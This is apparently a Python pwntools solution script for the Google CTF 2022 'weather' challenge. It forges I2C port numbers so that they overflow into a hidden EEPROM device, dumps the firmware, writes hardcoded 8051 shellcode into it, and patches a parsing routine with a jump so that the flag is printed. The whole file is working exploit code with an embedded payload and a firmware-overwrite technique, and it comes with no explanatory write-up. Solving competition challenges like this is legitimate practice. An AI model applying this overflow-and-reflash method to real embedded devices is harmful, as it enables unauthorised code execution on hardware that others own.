#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "weather.2022.ctfcompetition.com"
PORT = 1337

THERMO = 101
PRESSURE = 108
LIGHTA = 110
LIGHTB =  111
HUMIDITY = 119

def send_read(dest_port, req_len):
	print("Read from: %d" % dest_port)

	# forge port number to overflow into requested port number
	cmd = "r 1010000{} {}".format(dest_port+128, req_len)
	
	# send i2c command
	print("CMD: %s" % cmd)
	r.sendline(cmd)

	# show i2c response
	print("RESP: %s" % r.recvline())

	# read and parse response
	data = r.recvuntil(" \n-end", drop=True)
	data = data.replace("\n", " ").split(" ")	
	res = "".join(map(lambda x: chr(int(x)), data))

	print(hexdump(res))

	r.recvuntil("? ")

	return res

def send_write(dest_port, req_len, values):
	# forge port number to overflow into requestes port number
	cmd = "w 1010000{} {}".format(dest_port+128, req_len)

	# append values
	for val in values:		
		cmd += " "+str(val)

	# send i2c command
	print("CMD: %s" % cmd)
	r.sendline(cmd)

	print(r.recvuntil("? "))

def write_eprom(page, data):
	# start package with page index and 4ByteWriteKey
	write_arr = [page, 0xa5, 0x5a, 0xa5, 0x5a]

	# add inverted byte as clear mask
	for b in data:
		write_arr.append(ord(b) ^ 0xff)

	# send package
	send_write(33, len(write_arr), write_arr)


def dump_eprom():
	with open("eprom.bin", "wb") as f:
		for i in range(0, 128):
			send_write(33, 1, [i])
			res = send_read(33, 64)

			f.write(res)
			f.flush()

def patch_eprom():
	with open("eprom.bin", "rb") as f:
		data = f.read()

	with open("eprom_patch.bin", "wb") as f:
		data = data[:0xa04] + "\x79\x00\xe9\xf5\xee\xe5\xef\xf8\xe5\xf3\x60\xfc\xe8\xf5\xf2\x09\x80\xf0"

		f.write(data)

def exploit(r):
	r.recvuntil("? ")

	# write flag dumper code to end of firmware
	write_eprom(40, "\x39\x00\xff\xff\x79\x00\xe9\xf5\xee\xe5\xef\xf8\xe5\xf3\x60\xfc\xe8\xf5\xf2\x09\x80\xf0")

	# write LJMP 0xa04 into str_to_uint8	
	address = 0x341
	
	page = address / 64
	off = address % 64

	code = "\x00"*off
	code += "\x02\x0a\x04"

	write_eprom(page, code)

	# trigger str_to_uint8
	r.sendline("r 119")

	# print output (filter null bytes)
	while True:
		ch = r.recv(1)
		if ch != "\x00":
			sys.stdout.write(ch)

	r.interactive()
	
	return

if __name__ == "__main__":
	r = remote(HOST, PORT)		
	
	exploit(r)